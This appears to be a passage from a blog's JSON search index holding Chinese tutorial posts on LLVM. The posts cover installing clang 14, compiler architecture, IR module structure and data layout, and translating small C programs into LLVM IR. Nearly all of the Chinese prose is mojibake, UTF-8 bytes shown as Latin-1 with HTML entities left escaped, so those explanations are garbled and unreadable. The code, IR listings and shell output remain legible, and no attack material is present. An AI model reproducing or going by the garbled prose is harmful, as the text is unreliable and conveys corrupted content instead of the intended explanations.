\"llvm/Bitcode/BitcodeWriter.h\" * 2022-05-02 12:11:57 * å°†ä¿®æ”¹åçš„IR å­˜å‚¨åˆ°æ–‡ä»¶ä¸­ï¼Œ æ‰§è¡Œ * */ std::error_code EC; llvm::raw_fd_ostream OS(\"aftermain.bc\", EC,llvm::sys::fs::OpenFlags()); llvm::WriteBitcodeToFile(*M,OS,true); OS.flush(); return 0; &#125; 2.7) æ•ˆæœ ä¸‰) æ€»ç»“ æŒ‡ä»¤æ“ä½œ æ ¸å¿ƒæ˜¯é¦–å…ˆè¦æ‰¾åˆ°å¯¹åº”çš„æŒ‡ä»¤æ‰€åœ¨çš„ä½ç½®ï¼› æ„å»ºæ–°çš„æŒ‡ä»¤ï¼Œæ›¿æ¢æ‰åŸæ¥çš„æŒ‡ä»¤æ“ä½œï¼Œ aï¼‰æ„å»ºæ–°çš„æ“ä½œæŒ‡ä»¤ä½¿ç”¨BinaryOperator::CreateXXX ä¸éœ€è¦æŒ‡å®šæ’å…¥ä½ç½® å¦‚æœä½¿ç”¨`BinaryOperator::Create`&lt;font color='cornflowerblue'&gt;åˆ™éœ€è¦æŒ‡å®šæ’å…¥ä½ç½®&lt;/font&gt; bï¼‰æ›¿æ¢æŒ‡ä»¤æ“ä½œä½¿ç”¨ReplaceInstWithInst() è®¾è®¡å¤´æ–‡ä»¶`&quot;llvm/Transforms/Utils/BasicBlockUtils.h&quot;` ç›¸åº”çš„æ›¿æ¢æ“ä½œè¿˜æœ‰å¾ˆå¤šï¼Œ åƒ`ReplaceInstWithValue` cï¼‰å°†ä¿®æ”¹åçš„æ–‡ä»¶ä»¥bitcodeå½¢å¼å­˜æ”¾åˆ°æ–‡ä»¶ä¸­ï¼Œ å†™å…¥ä¹‹å‰æœ€å¥½è¿›è¡ŒModuleçš„éªŒè¯ è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°ï¼š 1. æ–‡ä»¶è¯»å…¥åˆ°Moduleç±»ï¼› 2. è¿­ä»£å™¨çš„ä½¿ç”¨ 3. è·å–æŒ‡ä»¤çš„æ“ä½œæ•° 4. åˆ›å»ºæ–°çš„æŒ‡ä»¤ 5. æŒ‡ä»¤æ›¿æ¢ 6. ModuleéªŒè¯ 7. å†™å…¥æ–‡ä»¶","categories":[{"name":"Master","slug":"Master","permalink":"https://www.sizaif.com/navigation/categories/Master/"},{"name":"LLVM","slug":"Master/LLVM","permalink":"https://www.sizaif.com/navigation/categories/Master/LLVM/"}],"tags":[{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.sizaif.com/tags/fuzzing/"},{"name":"LLVM","slug":"LLVM","permalink":"https://www.sizaif.com/tags/LLVM/"}],"author":"sizaif"},{"title":"LLVM å­¦ä¹ (ä¸€) åˆè¯†LLVM","slug":"LLVM-å­¦ä¹ -ä¸€-åˆè¯†LLVM","date":"2022-04-20T11:19:36.000Z","updated":"2022-05-03T14:17:37.535Z","comments":true,"path":"posts/69383cde/","link":"","permalink":"https://www.sizaif.com/posts/69383cde/","excerpt":"","text":"LLVM å­¦ä¹ (ä¸€) åˆè¯†LLVM @2022-04-16 10:09:06 @sizaif LLVMå®‰è£…&amp;ç¯å¢ƒæ­å»º å®˜ç½‘ä¸‹è½½é¢„ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ ä¿®æ”¹ç¯å¢ƒå˜é‡æŒ‡å‘ export PATH=&quot;$PATH:/usr/local/clang+llvm/bin&quot; æ£€æŸ¥ä½¿ç”¨ root@0187031113b5:/home/workhome# env | grep PATH PATH=/usr/local/clang+llvm/bin:/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin root@0187031113b5:/home/workhome# clang --version clang version 14.0.0 Target: x86_64-unknown-linux-gnu Thread model: posix InstalledDir: /usr/local/clang+llvm/bin root@0187031113b5:/home/workhome# llvm-as --version LLVM (http://llvm.org/): LLVM version 14.0.0 Optimized build. Default target: x86_64-unknown-linux-gnu Host CPU: skylake root@0187031113b5:/home/workhome# LLVMæ¶æ„ ä½¿ç”¨å¯é‡ç”¨çš„ç»„ä»¶æ„å»ºçš„æ–°çš„ç¼–è¯‘å™¨ä½“ç³»ç»“æ„ å°†ç°æœ‰è¯­è¨€é‡æ–°è®¾ç½®åˆ°JITæˆ–é™æ€ç¼–è¯‘ å…¶ä¸»è¦ç»„ä»¶æ˜¯å‰ç«¯ï¼Œä¼˜åŒ–å™¨å’Œåç«¯ã€‚å‰ç«¯è§£ææºä»£ç ï¼Œæ£€æŸ¥å…¶é”™è¯¯ï¼Œå¹¶æ„å»ºç‰¹å®šäºè¯­è¨€çš„æŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰ä»¥è¡¨ç¤ºè¾“å…¥ä»£ç ã€‚ASTå¯é€‰åœ°å°†å…¶è½¬æ¢ä¸ºæ–°çš„ä¼˜åŒ–è¡¨ç¤ºï¼Œå¹¶ä¸”ä¼˜åŒ–å™¨å’Œåç«¯åœ¨ä»£ç ä¸Šè¿è¡Œã€‚ ä¼˜åŒ–å™¨è´Ÿè´£è¿›è¡Œå„ç§å„æ ·çš„è½¬æ¢ï¼Œä»¥æ”¹è¿›ä»£ç çš„è¿è¡Œæ—¶é—´ï¼Œä¾‹å¦‚æ¶ˆé™¤å†—ä½™è®¡ç®—ï¼Œå¹¶ä¸”é€šå¸¸æˆ–å¤šæˆ–å°‘åœ°ç‹¬ç«‹äºè¯­è¨€å’Œç›®æ ‡ã€‚ åç«¯(ä¹Ÿç§°ä¸ºä»£ç ç”Ÿæˆå™¨)ç„¶åå°†ä»£ç æ˜ å°„åˆ°ç›®æ ‡æŒ‡ä»¤é›†ã€‚é™¤äº†ç¼–å†™æ­£ç¡®çš„ä»£ç å¤–ï¼Œå®ƒè¿˜è´Ÿè´£ç”Ÿæˆåˆ©ç”¨å—æ”¯æŒä½“ç³»ç»“æ„çš„ç‰¹æ®Šç‰¹æ€§çš„å¥½ä»£ç ã€‚ç¼–è¯‘å™¨åç«¯çš„å…¬å…±éƒ¨åˆ†åŒ…æ‹¬æŒ‡ä»¤é€‰æ‹©ã€å¯„å­˜å™¨åˆ†é…å’ŒæŒ‡ä»¤è°ƒåº¦ã€‚ LLVMçš„è®¾è®¡æ¶æ„ æ”¯æŒä¸€ç§æ–°çš„ç¼–ç¨‹è¯­è¨€åªéœ€é‡æ–°å®ç°ä¸€ä¸ªå‰ç«¯ï¼Œæ”¯æŒä¸€ç§æ–°çš„ç›®æ ‡æ¶æ„åªéœ€é‡æ–°å®ç°ä¸€ä¸ªåç«¯ï¼Œå‰ç«¯å’Œåç«¯è¿æ¥æ¢çº½å°±æ˜¯LLVM IRã€‚ LLVMçš„å«ä¹‰ åœ¨ä¸åŒçš„è¯­ä¹‰ç¯å¢ƒä¸‹ï¼ŒLLVMå…·æœ‰ä»¥ä¸‹å‡ ç§ä¸åŒçš„å«ä¹‰ï¼š LLVMåŸºç¡€æ¶æ„ï¼šå³ä¸€ä¸ªå®Œæ•´ç¼–è¯‘å™¨é¡¹ç›®çš„é›†åˆï¼ŒåŒ…æ‹¬ä½†ä¸é™äºå‰ç«¯ã€åç«¯ã€ä¼˜åŒ–å™¨ã€æ±‡ç¼–å™¨ã€é“¾æ¥å™¨ã€libcppæ ‡å‡†åº“ã€Compiler-RTå’ŒJITå¼•æ“ åŸºäºLLVMæ„å»ºçš„ç¼–è¯‘å™¨ï¼šéƒ¨åˆ†æˆ–å®Œå…¨ä½¿ç”¨LLVMæ„å»ºçš„ç¼–è¯‘å™¨ LLVMåº“ï¼šLLVMåŸºç¡€æ¶æ„å¯é‡ç”¨ä»£ç éƒ¨åˆ† LLVMæ ¸å¿ƒï¼šåœ¨LLVM IRä¸Šè¿›è¡Œçš„ä¼˜åŒ–å’Œåç«¯ç®—æ³• LLVM IRï¼šLLVMä¸­é—´è¡¨ç¤º LLVMåŸºç¡€æ¶æ„çš„ç»„æˆéƒ¨åˆ† å‰ç«¯ï¼šå°†ç¨‹åºæºä»£ç è½¬æ¢ä¸ºLLVM IRçš„ç¼–è¯‘å™¨æ­¥éª¤ï¼ŒåŒ…æ‹¬è¯æ³•åˆ†æå™¨ã€è¯­æ³•åˆ†æå™¨ã€è¯­ä¹‰åˆ†æå™¨ã€LLVM IRç”Ÿæˆå™¨ã€‚Clangæ‰§è¡Œäº†æ‰€æœ‰ä¸å‰ç«¯ç›¸å…³çš„æ­¥éª¤ï¼Œå¹¶æä¾›äº†ä¸€ä¸ªæ’ä»¶æ¥å£å’Œä¸€ä¸ªå•ç‹¬çš„é™æ€åˆ†æå·¥å…·æ¥è¿›è¡Œæ›´æ·±å…¥çš„åˆ†æ ä¸­é—´è¡¨ç¤ºï¼šLLVM IRå¯ä»¥ä»¥å¯è¯»æ–‡æœ¬ä»£ç å’ŒäºŒè¿›åˆ¶ä»£ç ä¸¤ç§å½¢å¼å‘ˆç°ã€‚LLVMåº“ä¸­æä¾›äº†å¯¹IRè¿›è¡Œæ„é€ ã€ç»„è£…å’Œæ‹†å¸çš„æ¥å£ã€‚LLVMä¼˜åŒ–å™¨ä¹Ÿåœ¨IRä¸Šè¿›è¡Œæ“ä½œï¼Œå¹¶åœ¨IRä¸Šè¿›è¡Œäº†å¤§éƒ¨åˆ†ä¼˜åŒ–ã€‚ åç«¯ï¼šè´Ÿè´£æ±‡ç¼–ç æˆ–æœºå™¨ç ç”Ÿæˆçš„æ­¥éª¤ï¼Œå°†LLVM IRè½¬æ¢ä¸ºç‰¹å®šæœºå™¨æ¶æ„çš„æ±‡ç¼–ä»£ç æˆ–è€ŒäºŒè¿›åˆ¶ä»£ç ï¼ŒåŒ…æ‹¬å¯„å­˜å™¨åˆ†é…ã€å¾ªç¯è½¬æ¢ã€çª¥è§†å­”ä¼˜åŒ–å™¨ã€ç‰¹å®šæœºå™¨æ¶æ„çš„ä¼˜åŒ–å’Œè½¬æ¢ç­‰æ­¥éª¤ ä¸‹é¢è¿™å¼ å›¾å±•ç¤ºäº†ä½¿ç”¨LLVMåŸºç¡€æ¶æ„æ—¶å„ä¸ªç»„ä»¶ä¹‹é—´çš„å…³ç³» é™¤æ­¤ä¹‹å¤–ï¼Œå„ä¸ªç»„ä»¶ä¹‹é—´çš„åä½œå…³ç³»ä¹Ÿå¯ä»¥ä»¥ä¸‹é¢è¿™ç§æ–¹å¼ç»„ç»‡ ä¸¤ç§æ–¹å¼çš„ä¸»è¦åŒºåˆ«æ˜¯ç¨‹åºæºä»£ç å†…éƒ¨çš„é“¾æ¥æ˜¯ç”±LLVMæˆ–ç³»ç»Ÿé“¾æ¥å™¨å®Œæˆçš„è¿˜æ˜¯ç”±LLVM IRé“¾æ¥å™¨å®Œæˆçš„ï¼Œå‰è€…æ˜¯é»˜è®¤æ–¹å¼ï¼Œåè€…ä¸€èˆ¬åœ¨å¼€å¯é“¾æ¥ä¼˜åŒ–ï¼ˆLink-Time Optimizationï¼‰æ—¶é‡‡ç”¨ LLVM GCC 4.2 è®¾è®¡ é“¾æ¥LLVMå’ŒGCCç¼–è¯‘çš„ä»£ç  å¯ä»¥å®‰å…¨åœ°åœ¨ç¼–è¯‘å™¨ä¹‹é—´æ··åˆå’ŒåŒ¹é….oæ–‡ä»¶ å¯ä»¥å®‰å…¨åœ°è°ƒç”¨åˆ°ä¸å…¶ä»–ç¼–è¯‘å™¨ä¸€èµ·æ„å»ºçš„åº“ä¸­ é“¾æ¥æ—¶é—´ä¼˜åŒ– ä½¿ç”¨-O4å¯¹æ–‡ä»¶è¿›è¡Œä¼˜åŒ–ï¼ˆä¾‹å¦‚å†…è”ã€å›ºå®šæŠ˜å ç­‰ï¼‰ å¯ä»¥è·¨è¯­è¨€è¾¹ç•Œè¿›è¡Œä¼˜åŒ– LLVMä¸­é—´æ•°æ®ç»“æ„ åœ¨LLVMä¸­å¹¶ä¸åªå­˜åœ¨LLVM IRä¸€ç§ä¸­é—´è¡¨ç°å½¢å¼ï¼ŒLLVMåœ¨ä¸åŒç¼–è¯‘é˜¶æ®µé‡‡ç”¨ä»¥ä¸‹ä¸åŒçš„ä¸­é—´æ•°æ®ç»“æ„ï¼š LLVM IRï¼š æŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰ï¼šå°†æºä»£ç è½¬æ¢ä¸ºLLVM IRæ—¶ï¼ŒClangå‰ç«¯è¯­æ³•åˆ†æå™¨å’Œè¯­ä¹‰åˆ†æå™¨çš„äº§å‡ºæ•°æ®ç»“æ„ æœ‰å‘æ— ç¯å›¾ï¼ˆDAGï¼‰ï¼šå°†LLVM IRè½¬æ¢ä¸ºç‰¹å®šæœºå™¨æ¶æ„çš„æ±‡ç¼–ä»£ç æ—¶ï¼ŒLLVMé¦–å…ˆå°†å…¶è½¬æ¢ä¸ºæœ‰å‘æ— ç¯å›¾ï¼ˆDAGï¼‰çš„å½¢å¼ï¼Œä»¥æ–¹ä¾¿è¿›è¡ŒæŒ‡ä»¤é€‰æ‹©ï¼Œç„¶åå°†å…¶è½¬æ¢å›ä¸‰åœ°å€ç çš„å½¢å¼ä»¥è¿›è¡ŒæŒ‡ä»¤è°ƒåº¦ MCModuleç±»ï¼šä¸ºäº†å®ç°æ±‡ç¼–å™¨å’Œé“¾æ¥å™¨ï¼ŒLLVMä½¿ç”¨MCModuleç±»å°†ç¨‹åºè¡¨ç¤ºä¿å­˜åœ¨å¯¹è±¡æ–‡ä»¶ï¼ˆå¯é‡å®šå‘æ–‡ä»¶çš„ä¸€ç§ï¼Œé€šå¸¸æ–‡ä»¶åä»¥.oç»“å°¾ï¼‰çš„ä¸Šä¸‹æ–‡ä¸­ ä¸åŒç¼–è¯‘é˜¶æ®µçš„ä¸­é—´æ•°æ®ç»“æ„æœ‰ä»¥ä¸‹ä¸¤ç§å­˜åœ¨æ–¹å¼ï¼š å†…å­˜ä¸­ï¼šéœ€è¦ç¼–è¯‘é©±åŠ¨ç¨‹åºçš„å¸®åŠ©ï¼Œå°†ä¸€ä¸ªé˜¶æ®µçš„è¾“å‡ºæ•°æ®ç»“æ„ä½œä¸ºä¸‹ä¸€ä¸ªé˜¶æ®µçš„è¾“å…¥æ•°æ®ç»“æ„ æ–‡ä»¶ä¸­ï¼šç‹¬ç«‹å‘½ä»¤ä¹‹é—´å¤šæ•°ä»¥æ–‡ä»¶ä¸ºåª’ä»‹è¿›è¡Œäº¤äº’ï¼Œæ¯”å¦‚æ±‡ç¼–å™¨ä¸é“¾æ¥å™¨é€šè¿‡å¯é‡å®šå‘çš„.oå¯¹è±¡æ–‡ä»¶è¿›è¡Œäº¤äº’ LLVM IR (Intermediate Representationï¼ŒIR) LLVMçš„ä¸­é—´è¡¨ç¤ºï¼Œæœ¬è´¨ä¸Šä¸€ç§ä¸æºç¼–ç¨‹è¯­è¨€å’Œç›®æ ‡æœºå™¨æ¶æ„æ— å…³çš„é€šç”¨ä¸­é—´è¡¨ç¤º LLVM IRæ˜¯ä¸€ç§ç±»ä¼¼äºRISCçš„ä½çº§è™šæ‹ŸæŒ‡ä»¤é›† LLVMæ˜¯ä½¿ç”¨ç®€å•ç±»å‹ç³»ç»Ÿçš„å¼ºç±»å‹(ä¾‹å¦‚ï¼Œi32æ˜¯ä¸€ä¸ª32ä½æ•´æ•°ï¼Œi32** æ˜¯æŒ‡å‘32ä½æ•´æ•°çš„æŒ‡é’ˆ) LLVM IR ä¸ä½¿ç”¨ä¸€ç»„å›ºå®šçš„å‘½åå¯„å­˜å™¨,å®ƒä½¿ç”¨ä¸€ä¸ªåä¸º%å­—ç¬¦çš„æ— é™ä¸´æ—¶é›†åˆ LLVM IRä»£è¢«è®¾è®¡æˆä¸‰ç§ä¸åŒçš„å½¢å¼:å†…å­˜ç¼–è¯‘å™¨IRï¼Œç£ç›˜äºŒè¿›åˆ¶.bcè¡¨ç¤º(é€‚åˆäºå³æ—¶ç¼–è¯‘å™¨çš„å¿«é€ŸåŠ è½½)ï¼Œå¯è¯»çš„æ±‡ç¼–è¯­è¨€.ll cä»£ç  unsigned add1(unsigned a, unsigned b) &#123; return a+b; &#125; // Perhaps not the most efficient way to add two numbers. unsigned add2(unsigned a, unsigned b) &#123; if (a == 0) return b; return add2(a-1, b+1); &#125; å¯¹åº” llvmIR .llæ–‡ä»¶ define i32 @add1(i32 %a, i32 %b) &#123; entry: %tmp1 &#x3D; add i32 %a, %b ret i32 %tmp1 &#125; define i32 @add2(i32 %a, i32 %b) &#123; entry: %tmp1 &#x3D; icmp eq i32 %a, 0 br i1 %tmp1, label %done, label %recurse recurse: %tmp2 &#x3D; sub i32 %a, 1 %tmp3 &#x3D; add i32 %b, 1 %tmp4 &#x3D; call i32 @add2(i32 %tmp2, i32 %tmp3) ret i32 %tmp4 done: ret i32 %b &#125; LLVM IRç»“æ„ Moduleï¼ˆæ¨¡å—ï¼‰æ˜¯ä¸€ä»½LLVM IRçš„é¡¶å±‚å®¹å™¨ï¼Œå¯¹åº”äºç¼–è¯‘å‰ç«¯çš„æ¯ä¸ªç¿»è¯‘å•å…ƒï¼ˆTranslationUnitï¼‰ã€‚æ¯ä¸ªæ¨¡å—ç”±ç›®æ ‡æœºå™¨ä¿¡æ¯ã€å…¨å±€ç¬¦å·ï¼ˆå…¨å±€å˜é‡å’Œå‡½æ•°ï¼‰åŠå…ƒä¿¡æ¯ç»„æˆã€‚ Functionï¼ˆå‡½æ•°ï¼‰å°±æ˜¯ç¼–ç¨‹è¯­è¨€ä¸­çš„å‡½æ•°ï¼ŒåŒ…æ‹¬å‡½æ•°ç­¾åå’Œè‹¥å¹²ä¸ªåŸºæœ¬å—ï¼Œå‡½æ•°å†…çš„ç¬¬ä¸€ä¸ªåŸºæœ¬å—å«åšå…¥å£åŸºæœ¬å—ã€‚ BasicBlockï¼ˆåŸºæœ¬å—ï¼‰æ˜¯ä¸€ç»„é¡ºåºæ‰§è¡Œçš„æŒ‡ä»¤é›†åˆï¼Œåªæœ‰ä¸€ä¸ªå…¥å£å’Œä¸€ä¸ªå‡ºå£ï¼Œéå¤´å°¾æŒ‡ä»¤æ‰§è¡Œæ—¶ä¸ä¼šè¿èƒŒé¡ºåºè·³è½¬åˆ°å…¶ä»–æŒ‡ä»¤ä¸Šå»ã€‚æ¯ä¸ªåŸºæœ¬å—æœ€åä¸€æ¡æŒ‡ä»¤ä¸€èˆ¬æ˜¯è·³è½¬æŒ‡ä»¤ï¼ˆè·³è½¬åˆ°å…¶å®ƒåŸºæœ¬å—ä¸Šå»ï¼‰ï¼Œå‡½æ•°å†…æœ€åä¸€ä¸ªåŸºæœ¬å—çš„æœ€åæ¡æŒ‡ä»¤æ˜¯å‡½æ•°è¿”å›æŒ‡ä»¤ã€‚ Instructionï¼ˆæŒ‡ä»¤ï¼‰æ˜¯LLVM IRä¸­çš„æœ€å°å¯æ‰§è¡Œå•ä½ï¼Œæ¯ä¸€æ¡æŒ‡ä»¤éƒ½å•å ä¸€è¡Œ LLVM IRå¤´éƒ¨æ˜¯ä¸€äº›Target Informationï¼Œ ; ModuleID = 'add.c' source_filename = \"add.c\" target datalayout = \"e-m:o-i64:64-f80:128-n8:16:32:64-S128\" target triple = \"x86_64-apple-macosx10.14.0\" æ¯ä¸€è¡Œåˆ†åˆ«æ˜¯ï¼Œ ModuleIDï¼šç¼–è¯‘å™¨ç”¨äºåŒºåˆ†ä¸åŒæ¨¡å—çš„ID source_filenameï¼šæºæ–‡ä»¶å target datalayoutï¼šç›®æ ‡æœºå™¨æ¶æ„æ•°æ®å¸ƒå±€ target tripleï¼šç”¨äºæè¿°ç›®æ ‡æœºå™¨ä¿¡æ¯çš„ä¸€ä¸ªå…ƒç»„ï¼Œä¸€èˆ¬å½¢å¼æ˜¯&lt;architecture&gt;-&lt;vendor&gt;-&lt;system&gt;[-extra-info] éœ€è¦å…³æ³¨çš„æ˜¯target datalayoutï¼Œå®ƒç”±-åˆ†éš”çš„ä¸€åˆ—è§„æ ¼ç»„æˆ eï¼šå†…å­˜å­˜å‚¨æ¨¡å¼ä¸ºå°ç«¯æ¨¡å¼ m:oï¼šç›®æ ‡æ–‡ä»¶çš„æ ¼å¼æ˜¯Machæ ¼å¼ i64:64ï¼š64ä½æ•´æ•°çš„å¯¹é½æ–¹å¼æ˜¯64ä½ï¼Œå³8å­—èŠ‚å¯¹é½ f80:128ï¼š80ä½æ‰©å±•ç²¾åº¦æµ®ç‚¹æ•°çš„å¯¹é½æ–¹å¼æ˜¯128ä½ï¼Œå³16å­—èŠ‚å¯¹é½ n8:16:32:64ï¼šæ•´å‹æ•°æ®æœ‰8ä½çš„ã€16ä½çš„ã€32ä½çš„å’Œ64ä½çš„ S128ï¼š128ä½æ ˆè‡ªç„¶å¯¹é½ è¯¦ç»† https://llvm.org/docs/LangRef.html#data-layout","categories":[{"name":"Master","slug":"Master","permalink":"https://www.sizaif.com/navigation/categories/Master/"},{"name":"LLVM","slug":"Master/LLVM","permalink":"https://www.sizaif.com/navigation/categories/Master/LLVM/"}],"tags":[{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.sizaif.com/tags/fuzzing/"},{"name":"LLVM","slug":"LLVM","permalink":"https://www.sizaif.com/tags/LLVM/"}],"author":"sizaif"},{"title":"LLVM å­¦ä¹ (ä¸‰) -æ ·ä¾‹å­¦ä¹ ","slug":"LLVM-å­¦ä¹ -ä¸‰-æ ·ä¾‹å­¦ä¹ ","date":"2022-04-20T11:19:19.000Z","updated":"2022-05-03T14:11:17.699Z","comments":true,"path":"posts/9d5c50c6/","link":"","permalink":"https://www.sizaif.com/posts/9d5c50c6/","excerpt":"","text":"LLVM å­¦ä¹ (ä¸‰) -æ ·ä¾‹å­¦ä¹  @2022-04-17 09:28:38 @sizaif LLVM IR æ ·ä¾‹å­¦ä¹  1. åŸºæœ¬è¯­æ³• ç¼–å†™cä»£ç  # hello.c #include &lt;stdio.h> int add(int a,int b)&#123; return a + b; &#125; int main() &#123; int a = 10; int b = 22; printf(\"%d\\n\",add(a,b)); return 0; &#125; å°†cæºç è½¬æ¢ä¸ºLLVM IR-llæ ¼å¼ $ clang -emit-llvm -S hello.c -o hello.ll ç”Ÿæˆçš„hello.llå†…å®¹å¦‚ä¸‹ ; ModuleID &#x3D; &#39;hello.c&#39; source_filename &#x3D; &quot;hello.c&quot; target datalayout &#x3D; &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot; target triple &#x3D; &quot;x86_64-unknown-linux-gnu&quot; @.str &#x3D; private unnamed_addr constant [4 x i8] c&quot;%d\\0A\\00&quot;, align 1 ; Function Attrs: noinline nounwind optnone uwtable define dso_local i32 @add(i32 noundef %0, i32 noundef %1) #0 &#123; %3 &#x3D; alloca i32, align 4 %4 &#x3D; alloca i32, align 4 store i32 %0, i32* %3, align 4 store i32 %1, i32* %4, align 4 %5 &#x3D; load i32, i32* %3, align 4 %6 &#x3D; load i32, i32* %4, align 4 %7 &#x3D; add nsw i32 %5, %6 ret i32 %7 &#125; ; Function Attrs: noinline nounwind optnone uwtable define dso_local i32 @main() #0 &#123; %1 &#x3D; alloca i32, align 4 %2 &#x3D; alloca i32, align 4 %3 &#x3D; alloca i32, align 4 store i32 0, i32* %1, align 4 store i32 10, i32* %2, align 4 store i32 22, i32* %3, align 4 %4 &#x3D; load i32, i32* %2, align 4 %5 &#x3D; load i32, i32* %3, align 4 %6 &#x3D; call i32 @add(i32 noundef %4, i32 noundef %5) %7 &#x3D; call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i32 noundef %6) ret i32 0 &#125; declare dso_local i32 @printf(i8* noundef, ...) #1 attributes #0 &#x3D; &#123; noinline nounwind optnone uwtable &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;min-legal-vector-width&quot;&#x3D;&quot;0&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125; attributes #1 &#x3D; &#123; &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125; !llvm.module.flags &#x3D; !&#123;!0, !1, !2&#125; !llvm.ident &#x3D; !&#123;!3&#125; !0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125; !1 &#x3D; !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125; !2 &#x3D; !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125; !3 &#x3D; !&#123;!&quot;clang version 14.0.0&quot;&#125; æ³¨è§£æ˜¯ä»¥ ; åˆ†éš”ä¸”ç›´åˆ°å½“å‰è¡Œçš„ç»“å°¾ @ä»£è¡¨å…¨å±€æ ‡è¯†ç¬¦ï¼ˆå‡½æ•°ï¼Œå…¨å±€å˜é‡ï¼‰ï¼› %ä»£è¡¨å±€éƒ¨æ ‡è¯†ç¬¦ï¼ˆå¯„å­˜å™¨åç§°ä¹Ÿå°±æ˜¯å±€éƒ¨å˜é‡ï¼Œç±»å‹ï¼‰ã€‚ allocaæŒ‡ä»¤ï¼šç”¨äºåˆ†é…å†…å­˜å †æ ˆç»™å½“å‰æ‰§è¡Œçš„å‡½æ•°,å½“è¿™ä¸ªå‡½æ•°è¿”å›å…¶è°ƒç”¨è€…æ—¶è‡ªåŠ¨é‡Šæ”¾, ; Function Attrs: noinline nounwind optnone uwtable define dso_local i32 @add(i32 noundef %0, i32 noundef %1) #0 &#123; %3 &#x3D; alloca i32, align 4 ; åˆ†é…ä¸€ä¸ªå†…å­˜åˆ°å±€éƒ¨å˜é‡%3ï¼Œ4å­—èŠ‚å¯¹é½ %4 &#x3D; alloca i32, align 4 ; åˆ†é…ä¸€ä¸ªå†…å­˜åˆ°å±€éƒ¨å˜é‡%4ï¼Œ4å­—èŠ‚å¯¹é½ store i32 %0, i32* %3, align 4 ; å°†i32ç±»å‹çš„å˜é‡%0å­˜åˆ°å†…å­˜%3ä¸­, 4å­—èŠ‚å¯¹é½ store i32 %1, i32* %4, align 4 ; å°†i32ç±»å‹çš„å˜é‡%1å­˜åˆ°å†…å­˜%4ä¸­, 4å­—èŠ‚å¯¹é½ %5 &#x3D; load i32, i32* %3, align 4 ; è¯»å–å˜é‡%3å†…å­˜ä¸­çš„æ•°æ®å­˜æ”¾åˆ°ä¸´æ—¶å˜é‡%5ä¸­ï¼Œ4å­—èŠ‚å¯¹é½ %6 &#x3D; load i32, i32* %4, align 4 ; è¯»å–å˜é‡%4å†…å­˜ä¸­çš„æ•°æ®å­˜æ”¾åˆ°ä¸´æ—¶å˜é‡%6ä¸­ï¼Œ4å­—èŠ‚å¯¹é½ %7 &#x3D; add nsw i32 %5, %6 ; å°†å˜é‡%5,%6ä¸­çš„æ•°æ®è¿›è¡Œaddè¿ç®—,ç»“æ„å­˜åˆ°%7ä¸­ ret i32 %7 ; è¿”å›i32ç±»å‹çš„%7 &#125; hello.llè½¬å›hello.bc bitcodeæ ¼å¼ $ llvm-as hello.ll -o hello.bc root@0187031113b5:/home/workhome/llvm_test# ll total 20 drwxr-xr-x 2 root root 4096 Apr 17 02:09 ./ drwxr-xr-x 1 root root 4096 Apr 16 06:51 ../ -rw-r--r-- 1 root root 2456 Apr 17 02:09 hello.bc -rw-r--r-- 1 root root 142 Apr 17 02:06 hello.c -rw-r--r-- 1 root root 1838 Apr 17 02:06 hello.ll æ‰§è¡Œhello.bc $ lli hello.bc root@0187031113b5:/home/workhome/llvm_test# lli hello.bc 32 2. if è¯­å¥ # if.c #include &lt;stdio.h> int main() &#123; int a = 11; if(a%2 == 0) return 0; else return 1; &#125; # if.ll ; ModuleID &#x3D; &#39;if.c&#39; source_filename &#x3D; &quot;if.c&quot; target datalayout &#x3D; &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot; target triple &#x3D; &quot;x86_64-unknown-linux-gnu&quot; ; Function Attrs: noinline nounwind optnone uwtable define dso_local i32 @main() #0 &#123; %1 &#x3D; alloca i32, align 4 %2 &#x3D; alloca i32, align 4 store i32 0, i32* %1, align 4 store i32 11, i32* %2, align 4 %3 &#x3D; load i32, i32* %2, align 4 %4 &#x3D; srem i32 %3, 2 ; srem å¸¦ç¬¦å·æ•´æ•°æ±‚ä½™ %5 &#x3D; icmp eq i32 %4, 0 ; æ¯”è¾ƒ %4 ä¸0 æ˜¯å¦ç›¸ç­‰ br i1 %5, label %6, label %7 ; åˆ†æ”¯é€‰æ‹©ï¼Œæ ¹æ®%5ç»“æœè·³è½¬åˆ°%6æˆ–%7 6: ; preds &#x3D; %0 store i32 0, i32* %1, align 4 br label %8 7: ; preds &#x3D; %0 store i32 1, i32* %1, align 4 br label %8 8: ; preds &#x3D; %7, %6 %9 &#x3D; load i32, i32* %1, align 4 ret i32 %9 &#125; attributes #0 &#x3D; &#123; noinline nounwind optnone uwtable &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;min-legal-vector-width&quot;&#x3D;&quot;0&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; 